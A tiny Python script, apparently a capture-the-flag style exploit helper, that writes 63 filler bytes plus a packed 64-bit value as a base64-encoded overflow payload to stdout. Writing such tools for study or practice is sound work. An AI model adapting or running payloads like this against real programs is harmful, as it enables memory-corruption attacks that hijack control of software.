
import sys
import struct
import base64

buf = b'WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW'
buf += struct.pack('<Q', 17006163501786004042)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
